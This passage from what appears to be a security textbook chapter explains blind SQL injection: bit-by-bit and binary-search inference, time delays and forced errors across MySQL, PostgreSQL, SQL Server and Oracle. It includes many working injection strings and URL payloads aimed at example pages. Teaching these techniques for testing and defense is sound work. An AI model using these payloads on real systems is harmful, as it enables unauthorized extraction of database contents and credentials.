SUBSTRING(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘8’,‘9’,‘a’,‘b’,‘c’,‘d’,‘e’,‘f’)  \nIncubating’ and SUBSTRING(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘8’,‘9’,‘a’,‘b’)  \nIncubating’ and SUBSTRING(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘e’,‘f’)  \nIncubating’ and SUBSTRING(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘d’)  \nCharacter is th us ‘c’  \nIn MySQL, it is possible to specify both the character set and the collation in a query. Below, we force two \nChinese characters to be interpreted and ordered as Latin characters:  \nSELECT _latin1 ‘ ’< _latin1 ‘ ’ COLLATE latin1_bin;  \nForcing multi -byte character sets like this is not recommended however, as it is heavily dependent on the \nmurky world of conversion and collation rules.  \n\nThe binary search technique grouped 8- bits into a byte and inferred the value of all 8 -bits \nthrough eight requests. Instead, let us attempt to infer the value of a single chosen bit per \nrequest (say, the second bit of the byte.) If successful, then we could issue eight parallel requests for all bits in a byte and retrieve its value in less time than the binary search method would take to retrieve the same byte since requests would be made side- by-side rather than one \nafter the other.  \nMassaging bits requires sufficiently helpful mechanisms within the SQL variant supported \nby the database  under attack and Table 5.2  lists the bit functions supported by MySQL, \nPostgreSQL, SQL Server, and Oracle on two integers i  and j. Since Oracle does not provide an \neasily accessible native OR and XOR function we can roll our own.  \nTable 5.2  Bitwise Operations in Four Databases  \n \nLet’s look at a few T -SQL predicates that ret urn true when the username’s first character has \na 1-bit set at position two otherwise they return false. A byte that has just the second most \nsignificant bit set corresponds to hexadecimal 40 16 and decimal value 64 10, which is used in the \npredicates below : \nASCII(SUBSTRING(SYSTEM_USER,1,1)) & 64 = 64  \nASCII(SUBSTRING(SYSTEM_USER,1,1)) & 64 > 0  \nASCII(SUBSTRING(SYSTEM_USER,1,1)) | 64 > \\  \nASCII(SUBSTRING(SYSTEM_USER,1,1))  \nASCII(SUBSTRING(SYSTEM_USER,1,1)) ^ 64 < \\  \nASCII(SUBSTRING(SYSTEM_USER,1,1))  \n\nEach of the predicates is equivalent although they obviously have slightly different syntax. \nThe first two use bitwise AND and are useful since they only reference the first character once \nwhich shortens the injection string. A further advantage is that sometimes the query that produces the character could be time inefficient or have side -effects on the database and we \nmay not want to run it twice. The third and forth predicates use OR and XOR, respectively, but require the byte to be retrieved twice, on both sides of the operator. Their only advantage is in situations where the ampersand character is not allowed due to restrictions placed in the vulnerable application or defensive layers protecting the application. We now have a method by which we can ask t he database whether a bit in a given byte is 1 or 0; if the predicate \nreturns true then the bit is 1 otherwise the bit is 0.  \nReturning to the chicken counting example, the SQL that will be executed to extract the first \nbit of the first byte is:  \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’ AND  \n ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 128=128--’  \nSQL to return the second bit is:  \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’ AND  \n ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 64=64-- ’ \nSQL to return the third bit is:  \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’ AND  \n ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 32=32-- ’ \nAnd so on until all eight bits have been recovered. Converted into eight individual requests \nmade to the chicken counting page we have these values for the status  parameter along with \nthe response when making the request:  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 128=128-- (False)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 64=64--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 32=32--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 16=16--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 8=8-- (False)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 4=4-- (False)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 2=2-- (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1)) & 1=1-- (True)  \nSince “True” represents 1 and “False” represents 0 we have the bit string 01110011 which is \n115 10. Looking up 115 10 on an AS CII chart give us ‘s’ which is the first character of the \nusername. Our focus then shifts to the next byte and the next after that until all bytes have been \nretrieved. When compared to the binary search method this bit -by-bit approach also requires \neight r equests so you may wonder what is the point of all this bit manipulation, however since \neach request is independent of all others so they can be trivially parallelized.  \nEight requests appear to be quite inefficient in retrieving a single byte, but when the  only \navailable option is blind SQL injection then this is a small price to pay. It goes without saying that while many SQL injection attacks can be implemented by hand, issuing eight custom requests to extract a single byte would leave most people reachin g for the painkillers. Since all \nthat differs between requests for different bits are a bunch of offsets, this task is eminently automatable and later in this chapter we will examine a number of tools that take the pain out of crafting these inference attacks.  \nTip \nIf you are ever in a situation where you need to have an integer value broken up into a bit string using SQL, then \nSQL Server 2000, 2005, and 2008 support a user -defined function FN_REPLINTTOBITSTRING(), which takes \nas its sole argument an integer  and returns a 32 -character string representing the bit string. For example, \nFN_REPLINTTOBITSTRING(ASCII(‘s’)) returns ‘00000000000000000000000001110011’, which is a 32- bit \nrepresentation of 115 10, or ‘s’.  \nAlternative Channel Techniques  \nThe second category  of methods for extracting data in blind SQL injection vulnerabilities is by \nmeans of alternative channels. What sets these methods apart from the inference techniques is that while inference techniques rely on the response sent by the vulnerable page, alt ernative \nchannel techniques utilize transports apart from the page response. This includes channels such \nas DNS, Email, and HTTP requests. A further attribute of alternative channel techniques is that \ngenerally they enable us to retrieve chunks of data at a time rather than infer the value of individual bits or bytes, which make alternative channels a very attractive option to explore. Instead of using eight requests to retrieve a single byte, we could possibly retrieve 200 bytes with a single request. Howe ver, most alternative channel techniques require larger exploit \nstrings than inference techniques. \nUsing time -based techniques  \nNow that we have covered a little background theory on both classes of techniques it is time to dig into the actual exploits. Whe n covering the various methods for inferring data there was an \nexplicit assumption that an inference mechanism existed that enabled us to either use a binary search method or a bit -by-bit method to retrieve the value of a byte. In this section a time -\nbased  mechanism that is usable with both inference methods is discussed and dissected. You \nwill recall that for the inference methods to work, all that is required is that we can differentiate between two states based on some attribute of the page response. One  attribute \nthat every response has is the time difference between when the request was made and when the response arrived. If we could pause a response for a few seconds when a particular state was true but not when the state was false, then we would have a signaling trick that would suit both inference methods.  \nWe will concentrate on two states: delayed or not. It is true that where timing is used then in \nfact every tick of a clock represents a possible state to confer information; by pausing for one, three or a million ticks, many states can be communicated. For example, Ferruh Mavituna \nshowed a technique by which a byte was split into two 4- bit nibbles and execution paused for \nthat number of seconds. To retrieve the byte 0xA3, a request is made for each nibble where the first nibble delays for 10 s and the second nibble pauses for 3 s. However, unreliable connections prevent exploitation with clock resolutions in the sub- second range as noise masks \nthe signal. Additionally, these types of approaches do not  reduce the total average running \ntime, though they do reduce the total number of requests needed.  \nDelaying Database Queries  \nSince introducing delays in queries is not a standardized capability of SQL databases, each database has its own trick to introduce delays and we cover MySQL, PostgreSQL, SQL Server, and Oracle.  \nMySQL Delays  \nMySQL has two possible methods of introducing de lays into queries, depending on the \nMySQL version. If the version is 5.0.12 or newer then a SLEEP()  function is present which \nwill pause the query for a fixed number of seconds (and microseconds if needed). Figure 5.4  \nshows a query that executed SLEEP(4.17) and took exactly 4.17 s to run as the result line \nshows. \n \nFigure 5.4  Executing MySQL SLEEP()  \nFor versions  of MySQL that do not have a SLEEP() function it is possible to duplicate the \nbehavior of SLEEP() using the BENCHMARK()  function which has the prototype \nBENCHMARK( N, expression ) where expression  is some SQL expression and N  is the number \nof times that the expression should be repeatedly executed. The primary difference between BENCHMARK() and SLEEP() is that benchmark introduces a variable but noticeable delay into the query, while SLEEP() forces a fixed delay. If the database is running under a heavy load then BENCHMARK() will run slower but since the noticeable delay is accentuated rather \nthan diminished the usefulness of BENCHMARK() in inference attacks remains. \nSince expressions are executed very quickly they need to be run many times before we start \nto see delays in the query and N  could take on values of 1,000,000,000 or higher if the \nexpression is not computationally intensive, in order to lower the influence that line jitter has on the request. The expression must be scalar, so functions that return s ingle values are useful \nas are subqueries that return scalars. Provided below are a number of examples of the BENCHMARK() function along with the time each took to execute on the author’s MySQL installation:  \nSELECT BENCHMARK(1000000,SHA1(CURRENT_USER)) (3. 01 seconds)  \n\nSELECT BENCHMARK(100000000,(SELECT 1)) (0.93 seconds)  \nSELECT BENCHMARK(100000000,RAND()) (4.69 seconds)  \nThis is all very neat, but how can we implement an inference -based blind SQL injection \nattack using delayed queries in MySQL? A demonstratio n might by suitable at this point so let \nus introduce the simple example application that is used from  this point (the chickens have \nhatched, no more eggs are left to count so the previous application is unneeded). It has a table \ncalled reviews  that stores  movie review data and the columns are id , review_author , and \nreview_content . When accessing the page count_reviews.php?review_author=MadBob then \nthe following SQL query is run:  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’  \nPossibly the simples t inference we can make is whether we are running as the root user. \nTwo methods are possible, one using SLEEP() and the other BENCHMARK():  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’ UNION SELECT \nIF(SUBSTRING(USER(),1,4)=‘ root’,SLEEP(5),1)  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’ UNION SELECT \nIF(SUBSTRING(USER(),1,4)=‘ root’,BENCHMARK(100000000,RAND()),1)  \nConverting these into page requests they become:  \ncount_reviews.php?review_author=MadBob’ UNION SELECT \nIF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)#  \ncount_reviews.php?review_author=MadBob’ UNION SELECT \nIF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1)#  \n(Note the replacement of ‘root’ with the string 0x726f6f74 which is a common evasion technique as it allows us to specify strings without using quotes, and the presence of the ‘#’ symbol at the end of each request to comment out any trailing characters.)  \nYou may recall that one can either infer data through a binary search approach or a bit -by-\nbit approach. Sinc e the underlying techniques and theory has already been dealt with in depth, \nwe merely provide exploit strings for both in the next two subsections.  \nGeneric MySQL Binary Search Inference Exploits  \nString injection points (will require massaging to get the n umber of columns in the UNION \nSELECT to match that of the first query):  \n‘ UNION SELECT IF(ASCII(SUBSTRING((…), i,1))>k,SLEEP(1),1)#  \n‘ UNION SELECT IF(ASCII(SUBSTRING((…), i, 1))>k,BENCHMARK(100000000, RAND()),1)#  \nNumeric injection points: \n+ if(ASCII(SUBSTRING((…),i ,1))>k,SLEEP(5),1)#  \n+ if(ASCII(SUBSTRING((…),i , 1))>k,BENCHMARK(100000000, RAND()),1)#  \nwhere i is the i th byte returned by the subquery (…) and k  is the current middle value of the \nbinary search. If the inference question returns TRUE then the response is delayed.  \nGeneric MySQL Bit -by-Bit Inference Exploits  \nString injection points using the bitwise AND, which can be substituted for other bit operations \n(these exploits will require massaging when used to match the number of columns in the UNION select to that of the first query):  \n‘ UNION SELECT IF(ASCII(SUBSTRING((…), i,1))&2j=2j,SLEEP(1),1)#  \n‘ UNION SELECT IF(ASCII(SUBSTRING((…), i,1))&2j=2j,BENCHMARK(100000000,RAND()),1)#  \nNumeric injection points: \n+ if(ASCII(SUBSTRING((…),i ,1))&2j=2j,SLEEP(1),1)#  \n+ if(ASCII(SUBSTRING((…),i ,1))2j=2j,BENCHMARK(100000000, RAND()),1)#  \n+ if(ASCII(SUBSTRING((…),i ,1))|2j>ASCII(SUBSTRING((…),i ,1)),SLEEP(1),1#  \n+ if(ASCII(SUBSTRING((…),i ,1))|2j>ASCII(SUBSTRING((…),i ,1)),BENCHMARK(100000000, RAND()),1)#  \n+ if(ASCII(SUBSTRING((…),i ,1))^2j<ASCII(SUBSTRING((…),i ,1)),SLEEP(1),1#  \n+ if(ASCII(SUBSTRING((…),i ,1))^2j<ASCII(SUBSTRING((…),i ,1)),BENCHMARK(100000000, RAND()),1)#  \nwhere i is the i th byte returned by the subquery (…) and j  is the bit we are interested in (bit 1 is \nthe least significant and bit 8 is the most significant). So if we want to retrieve bit 3 then \n2j = 23 = 8 and for bit 5, 2j = 25 = 32. \nTip \nAs always with SQL injection, asking which part of the legitimate query is  influenced by the attacker is an \nimportant step in understanding the effect of each exploit. For example, the timing -based inference attacks on \nMySQL almost always introduce a delay in the WHERE clause of query. However since the WHERE clause is \nevaluated  against each row, any delay is multiplied by the number of rows that the clause is compared against. For \nexample, using the exploit snippet “ + IF(ASCII(SUBSTRING((…), i,1))>k,SLEEP(5),1) ” on a table of 100 rows \nproduces a delay of 500 s. At first glance th is may seem contrary to what we would like, but it does allow us to \nestimate the size of tables; moreover since SLEEP() can pause for microseconds we can still have the overall \ndelay for the query take just a few seconds even if the table has thousands or millions of rows.  \nPostgreSQL Delays  \nPostgreSQL also has two possible methods of introducing delays into queries, depending on the version. If the version is 8.1 or older, then one can create a function in SQL that is bound to the system library’s sleep() f unction. However, in versions 8.2 and newer, this is not possible \nas extension libraries need to define magic constants, which your system library is unlikely to have. Instead, PostgreSQL provides a pg_sleep()  function as part of a default install, and is our \nstarting point. This function will pause execution for the given number of seconds (fractional components  are permitted too). However, pg_sleep() has a void return type which introduces \nadditional complexity, since it cannot be used in the typical WHER E clause. While many \nPostgreSQL drivers support stacked queries in a similar fashion to SQL Server, the results of the second query (containing pg_sleep()’s void return value) would be processed by the handling application, causing an error. For example, w hile the following query will pause \nexecution for a second, the handling application could fail in dealing with an unexpected result set: \nSELECT ∗ FROM reviews WHERE review_author=‘ MadBob’; SELECT CASE 1 WHEN 1 THEN pg_sleep(1) \nEND; \nOne solution in this case is to simply add on a third dummy query that returns the right \nnumber of columns:  \nSELECT ∗ FROM reviews WHERE review_author=‘ MadBob’; SELECT CASE 1 WHEN 1 THEN pg_sleep(1) \nEND; SELECT NULL,NULL,NULL;  \nHowever this is not nearly so neat as the split and balanced approach. If the database \nconnection is made by the database owner or  the connecting user has permission to create \nPL/pgSQL functions, then a pg_sleep() wrapper can be constructed that returns a value, and is \ntherefore usable in split and balanced exploits. PostgreSQL supports defining blocks of SQL \nusing a procedural language called PL/pgSQL, and permissions to create functions are assigned even to non- superuser accounts. However, the database owner must enable the \nlanguage p er database.  \nIf the connecting user is the database owner, then this query will enable PL/pgSQL:  \nCREATE LANGUAGE ‘plpgsql’;  \nOnce enabled (or if it was already present), the next step is to define the wrapper function \nPAUSE() which takes one argument, the d elay:  \nCREATE OR REPLACE FUNCTION pause(integer) RETURNS integer AS $$  \nDECLARE  \nwait alias for $1;  \nBEGIN  \n PERFORM pg_sleep(wait);  \n RETURN 1;  \nEND; \n$$ LANGUAGE ‘plpgsql’ STRICT;  \nNewlines in the function definition are irrelevant and the whole definition can be  placed on \na single line, making the exploitation string quite usable.  \nLastly, with the new function in place, it is now possible to call it directly in a query:  \nSELECT COUNT(∗ ) FROM reviews WHERE id=1+(SELECT CASE (expression) WHEN (condition ) THEN \nPAUSE(5) ELSE 1 END)  \nAn exploit string to test whether the connecting user is a superuser is:  \ncount_reviews.php?id=1+(SELECT CASE (SELECT usename FROM pg_user WHERE usesuper IS TRUE and \ncurrent_user=usename) WHEN (user) THEN PAUSE(5) ELSE 1 END)  \nWhat follows are  exploit strings for both binary search and bit -by-bit exploits.  \nGeneric PostgreSQL Binary Search Inference Exploits  \nString injection points with a stacked query and a user -defined pause() function:  \n’; SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1)) > k) THEN pg_sleep(1) END; SELECT NULL,…,NULL;--  \n’||(SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1)) > k ) THEN PAUSE(1) ELSE 1 END);--  \nNumeric injection points with a stacked query and a user -defined pause() function:  \n0; SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1)) > k) THEN pg_sleep(1) END; SELECT NULL,…,NULL;--  \n+ (SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1)) > k) THEN PAUSE(1) ELSE 1 END);--  \nwhere i is the i th byte returned by the subquery (…) and k  is the current middle value of the \nbinary search. If the inference question returns TRUE then the response is delayed.  \nGeneric PostgreSQL Bit -by-Bit Inference Exploits  \nString injection points using the bitwise AND, which can be substituted for other bit:  \n’; SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1))&2j=2j) THEN pg_sleep(1) END; SELECT NULL,…,NULL;  \n’||(SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1))&2j=2j) THEN PAUSE(1) ELSE 1 END);--  \nNumeric injection points: \n0; SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1)&2j=2j) THEN pg_sleep(1) END; SELECT NULL,…,NULL;--  \n+ (SELECT CASE WHEN (ASCII(SUBSTR(…,i ,1)&2j=2j) THEN PAUSE(1) ELSE 1 END);--  \nwhere i is the i th byte returned by the subquery (…) and j  is the bit we are interested in (bit 1 is \nthe least significant and bit 8 is the most sig nificant).  \nSQL Server Delays  \nSQL Server provides an explicit facility for pausing the execution of any query. Using the \nWAITFOR keyword it is possible to cause a SQL Server to halt execution of a query until some time period has passed, which can either be  relative to the time at which the keyword \nwas encountered or an absolute time when execution should resume (such as midnight). Mostly we use the relative option, which makes use of the DELAY keyword. Thus, to pause execution for 1 min and 53 s one would use \nWAITFOR DELAY ‘00:01:53’ . The result is a query that \nindeed executes for 1  min and 53 s as Figure 5.5 shows —the time the query took to execute is \nshown in the status bar along the bottom of the window. Note that this does not impose a maximum bound on the execution time; we are not telling the database to only execute for 1:53, rather we are adding 1:53 to whate ver be the query’s normal execution time so the delay \nis minimum bound.  \nNotes from the Underground  \nSimulating BENCHMARK() on Microsoft SQL Server and Other Databases  \nIn mid -2007 Chema Alonso published a technique for duplicating MySQL’s BENCHMARK() effect of \nprolonging queries through extra processing load “heavy queries” in SQL Server and this provided another \nmechanism for inferring data without the need for an explicit SLEEP() -type function. His technique used two \nsubqueries separated by a logical AND wh ere one of the queries would take a number of seconds to run and the \nother subquery contained an inference check. If the check failed (bit x  was zero) then the second subquery would \nreturn and the first subquery would be prematurely aborted due to the pres ence of the AND clause. The net effect \nwas if the bit being inferred was 1, then the request would consume more time than if the bit was 0. This was \ninteresting as it side -stepped any checks that explicitly banned the keywords ‘WAIT FOR DELAY’.  \nAlonso rele ased a tool implementing his idea with support for MS Access, MySQL, SQL Server and Oracle, \navailable from www.codeplex.com/marathontool . \n \nFigure 5.5  Executing WAITFOR DELAY  \nSince the WAITFOR keyword is not usable in subqueries, we do not have exploit strings \nthat use WAITFOR in the WHERE clause. However, SQL Server does support stacked queries \nwhich is very useful in this situation. The approach we follow is to build an exploit string that is simply tagged onto the back of the legitimate query,  completely separated through a semi -\ncolon. Unlike PostgreSQL, this works as the SQL Server drivers return the first query’s output to the handling application. \nLet us look at an example  application that is identical to the movie review application \ndemonstrated with MySQL previously, except that now the application runs on SQL Server and ASP.NET. The SQL query run by the page request count_reviews.aspx?status=Madbob is:  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘MadBob’  \nIn order to determine whether the database login is ‘sa’ we could execute the SQL:  \nSELECT COUNT( ∗) FROM reviews WHERE review_author=‘ MadBob’; IF SYSTEM_USER=‘ sa’ WAITFOR DELAY \n‘00:00:05’  \nIf the request took longer than 5 s then we infer that the login is ‘sa’. Converted into a page \nrequest, this becomes:  \ncount_reviews.aspx?review_author=MadBob’; IF SYSTEM_USER=‘sa’ WAITFOR DELAY ‘00:00:05  \nYou may have noticed that the page request did not have a trailing single quote and this was \nintentional as the vulnerable query supplied the final single quote. Another point to consider is \n\nthat the inference question we choose to ask has fewest possible answers: instead of testing \nwhether we are not  ‘sa’ we seek to affirm that we are by pausing for 5  s. If the question was \ninverted such that the delay only occurred when the login was not ‘sa’, then a quick response can infer ‘sa’ but it could also be as a result of a problem with the exploit. Where a long  \nresponse time is used to positively infer ‘sa’, a loaded server could cause confusion. However, repeating the test and continuing to observe long load times increases our confidence.  \nSince we can choose either a binary search or bit -by-bit method to infer  data and, given that \nthe underlying techniques and theory has already been dealt with in depth, we merely provide exploit strings for both in the next two subsections. \nGeneric SQL Server Binary Search Inference Exploits  \nString injection points (utilize stacked queries so UNIONs not required):  \n’; IF ASCII(SUBSTRING((…),i ,1)) > k WAITFOR DELAY ‘00:00:05’;--  \nwhere i is the i th byte returned by the one -row subquery (…) and k is the current middle value \nof the binary search. Numeric injection points are identic al except for the absence of the initial \nsingle quote:  \n; IF ASCII(SUBSTRING((…),i ,1)) > k  WAITFOR DELAY ‘00:00:05’;--  \nGeneric SQL Server Bit -by-Bit Inference Exploits  \nThe following is an example for string injection points using the bitwise AND, which can be substituted for other bit operations. This exploit utilizes stacked queries so UNION is not required:  \n’; IF ASCII(SUBSTRING((…),i ,1))&2j=2j WAITFOR DELAY ‘00:00:05’; -- \nwhere i  is the i th byte returned by the subquery (…) and j  is the bit position under examination. \nNumeric injection points are identical exception for the absence of the initial single quote:  \n; IF ASCII(SUBSTRING((…),i ,1))&2j=2j WAITFOR DELAY ‘00:00:05’;--  \nOracle Delays  \nThe situation with time -based blind SQL injection on Oracle is a little stickier. While it is true \nthat a SLEEP() equivalent exists in Oracle, the manner in which SLEEP() is called does not \nallow for it to be embedded in a WHERE clause of a SELECT statement. A number of SQL \ninjection resources point to the DBMS_LOCK package, which amongst other functions \nprovides the SLEEP() function. This can be called with:  \nBEGIN DBMS_LOCK.SLEEP(n ); END;  \nwhere n is the number of seconds to halt execution for. However there are a number of \nrestrictions with this method: first and foremost th is cannot be embedded in a subquery as it is \nPL/SQL code not SQL, and since Oracle does not support stacked queries this SLEEP() function is somewhat of a white elephant. Secondly, the DBMS_LOCK package is not available to users apart from DBAs by default and since non- privileged users are commonly \nused to connect to Oracle databases (well, more often seen than in the SQL Server world) this effectively makes the DBMS_LOCK trick moot. If we are lucky and the injection points were in a PL/SQL block then the f ollowing snippet would generate a delay:  \nIF (BITAND(ASCII(SUBSTR((…),i ,1)),2j)=2j) THEN DBMS_LOCK.SLEEP(5); END IF;  \nwhere i  is the i th byte returned by the subquery (…) and j  is the bit position under examination. \nSlavik Marchovic showed ( http://www.slaviks -blog.com/2009/10/13/blind- sql-injection -in-\noracle/ ) that time -based attacks can be implemented using the function \nDBMS_PIPE.RECEIVE_MESSAGE . This function is granted to public by default and allows one to \nspecify a message timeout when reading from a pipe and, since it is a function, can be embedded into SQL queries. The example below pauses execution for 5 s if the connecting user is a DBA:  \ncount_reviews.aspx?review_author=MadBob’ OR 1 = CASE WHEN \nSYS_CONTEXT(‘USERENV’,‘ISDBA’)=‘TRUE’ THEN DBMS_PIPE.RECEIVE_MESSAGE(‘foo’, 5) ELSE 1 END–  \nOne could also attempt the heavy query approach pioneered by Alonso. \nTime -Based Inference Considerations  \nNow that we have looked at specific exploit strings for four databases that enable both binary \nsearch and bit extraction time -based inference techniques, there are a few messy details that \nshould be brought to light. We have considered timing to be a  mostly static attribute where in \none case a request completes quickly but in the other state it completes very slowly, allowing us to infer state information. However this is only reliable where the causes of delay are guaranteed; in the real world this is seldom  the case. If a request takes a long time then it could \nbe as a result of the intentional delay we inserted, but the slow response might equally be \ncaused by a loaded database or congested communications channel. We can partially solve this in one of two w ays: \n1. Set the delay long enough to smooth out possible influence from other factors. If the average \nRTT is 50  ms then a 30  s delay provides a very wide gap that will mostly prevent other \ndelays from drowning out the inference. Unfortunately the delay val ue is dependent on the \nline conditions and database load, which are dynamic and hard to measure and so we tend to over-compensate making the retrieval of data inefficient. Setting the delay value too high \nalso runs the risk of triggering timeout exceptions  either in the database or in the web \napplication framework.  \n2. Send two almost identical requests simultaneously with the delay -generating clause \ndependent on a 0 -bit in one request and a 1- bit in the other. The first request to return \n(subject to normal error checking) will likely be the predicate that did not  induce a delay, \nand state can be inferred even in the presence of non- deterministic delay factors. The \nassumption that this rests on is that if both requests are made simultaneously, then the unpredictable delays are highly likely to affect both requests.  \nUsing Response -Based Techniques  \nJust as request timing was used to infer information about a particular byte, a second method for inferring state is by carefully examining all data in the response i ncluding content and \nheaders. State is inferred either by the text contained in the response or by forcing errors when particular values are under examination. For example, the inference exploit could contain logic that alters the query such that results a re returned when the examined bit is 1 and no results if \nthe bit is 0, or again, an error could be forced if a bit is 1 and no error generated when the bit is 0. \nAlthough error generating techniques are delved into shortly, it is worth mentioning that the \ntypes of errors we strive to generate are runtime errors in the application or database query execution rather than query compilation errors from the database. If the syntax in the query is wrong then it will always produce an error regardless of the infer ence question; the error \nshould only be generated when the inference question is either TRUE or FALSE, but never both. \nMost blind SQL injection tools use response -based techniques for inferring information as \nthe results are not influenced by uncontrolled variables such as load and line congestion; \nhowever this approach does rely on the injection point returning some modifiable response to \nthe attacker. We can use either the binary search approach or the bit -by-bit approach when \ninferring information by por ing over the response.  \nMySQL Response Techniques  \nConsider the case where the SQL query below is executed through a web application with input data MadBob and returns one row from the reviews  table that is contained in the page \nresponse. The query is:  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’  \nThe result of execution is a single row containing the number of reviews written by MadBob \nand this is displayed on the webpage in Figure 5.6 . \n \nFigure 5.6  Query for ‘MadBob’ Returns a Count of Two Reviews, Used as TRUE Inference  \nBy inserting a second predicate into the W HERE clause, it is possible to alter whether any \nresults are returned by the query. We can then infer one bit of information by asking whether the query returned a row or not with the statement:  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’ AND \nASCII(SUBSTRING(user(), i,1))&2j=2j # \nIf no results are returned then we can infer that bit j  of byte i  is 0, otherwise the bit is 1. This \nis visible in Figure 5.7, where a search with the string “ MadBob’ and \nif(ASCII(SUBSTRING(user(),1,1))>127,1,0)# ” produced a zero review count. This is a FALSE \nstate and so the first character has an ASCII value less than 127.  \n\n \nFigure 5.7  Query Returns a Count of Zero Reviews and is a FALSE Inference  \nWhere numeric parameters are used, it is possible to split and balance input. If the original \nquery is:  \nSELECT COUNT(∗ ) FROM reviews WHERE id= 1 \nthen a split and balanced injection string that implements the bit- by-bit approach is:  \nSELECT COUNT(∗ ) FROM reviews WHERE id=1+ if(ASCII(SUBSTRING(CURRENT_USER(),i ,1))&2j=2j,1,0)  \nWhere it is not possible to alter con tent, an alternative method of inferring state is to force \ndatabase errors where a 1 -bit is seen, and no errors when a 0- bit is seen. Using MySQL \nsubqueries in combination with a conditional statement, we can selectively generate an error \nwith this SQL que ry that implements the bit- by-bit inference method:  \nSELECT COUNT( ∗) FROM reviews WHERE id=IF(ASCII(SUBSTRING(CURRENT_USER(),i ,1))&2j=2j,(SELECT \ntable_name FROM information_schema.columns WHERE table_name = (SELECT table_name FROM \ninformation_schema.columns)),1);  \nThis is fairly dense, so it helps to break the query up into pieces. The conditional branching \nis handled by the IF() statement and the condition we are testing is one we have seen quite \nregularly through this chapter, ASCII(SUBSTRING(CURRENT_USER(), i,1))&2j=2j, which implements \nthe bit -by-bit inference method. If the condition is true (i.e. bit j  is a 1 -bit), then the query \n“SELECT table_name FROM information_schema.columns WHERE table_name = (SELECT table_name \nFROM information_schema.columns) ” is run and this query has a subquery that returns multiple \nrows in a comparison. Since this is forbidden, execution halts with an error. On the other hand, \nif bit j  was a 0 -bit then the IF() statement returned the value ‘1’. The true branch on the IF() \nstatement uses the built -in information_schema.columns table as this exists in all MySQL \ndatabases version 5.0 and higher.  \n\nIt should be pointe d out that when using an application written in PHP with MySQL as the \ndata store, errors arising from the execution of database queries do not generate exceptions that \ncause generic error pages. The calling page must either check whether mysql_query()  returns \nFALSE,  or whether mysql_error()  returns a non -empty string; if either condition exists then the \npage prints an application specific error message. The result of this is that MySQL errors do not produce HTTP 500 response codes, rather the regular 200 re sponse code is seen.  \nPostgreSQL Response Techniques  \nResponse -based attacks for PostgreSQL are similar to MySQL. We can then infer one bit of \ninformation by asking whether the query returned a row or not with the statement:  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘MadBob’ AND \nASCII(SUBSTRING(user(), i,1))&2j=2j-- \nIf no results are returned then we can infer that bit k  of byte i  is 0, otherwise the bit is 1.  \nFor split and balanced numeric input, a query relying on our (discussed earlier in the \nchapter ) user -defined PAUSE() function might look like:  \nSELECT COUNT(∗ ) FROM reviews WHERE id=1+(SELECT CASE WHEN (ASCII(SUBSTR(… ,i,1)&2j=2j) THEN \nPAUSE(1) ELSE 0 END);--  \nPAUSE() returns 1; a trivial extension would be to alter the function definition to return a  \nuser-supplied value.  \nSimilarly to MySQL, database errors can be forced when content is unalterable by \nselectively forcing a divide- by-zero condition. The query below produces an error when the \ncondition (…), which could be a binary search or bit -by-bit ex ploit, is true:  \nSELECT CASE (…) WHEN TRUE THEN 1/0 END  \nThis can be combined into split and balanced exploits quite easily:  \n‘||(SELECT CASE (…) WHEN TRUE THEN 1/0 END)||’  \nError management is highly dependent on the handling application. For example, a PHP \ninstallation configured with “display_errors  = On” would likely display error messages from \nthe database (subject to further configuration parameters). But it is also likely that the page handles errors itself without displaying detailed error information; in terms of this blind \ninjection technique, so long as a differentiation is visible then information can still be \nextracted.  \nSQL Server Response Techniques  \nConsider the T -SQL below that can infer 1 -bit of information by asking whether a vulnerable \nquery re turned rows or not with the statement: \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’ and SYSTEM_USER=‘ sa’ \nIf the query returned results then the login in use was ‘sa’, and if no rows came back then \nthe login was something else. We can integrate  this quite easily with the binary search and bit -\nby-bit inference methods in order to extract the actual login:  \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’ AND \nASCII(SUBSTRING(SYSTEM_USER,i ,1))>k-- \nor \nSELECT COUNT(∗ ) FROM reviews WHERE review_author=‘ MadBob’ AND \nASCII(SUBSTRING(SYSTEM_USER,i ,1))&2j=2j \nThe split and balance trick works quite nicely with response -based inference on SQL Server. \nCombined with a conditional subquery that uses CASE, we can include  a string as part of the \nsearch depending on the state of a bit or value. Consider first a binary search example:  \nSELECT COUNT( ∗) FROM reviews 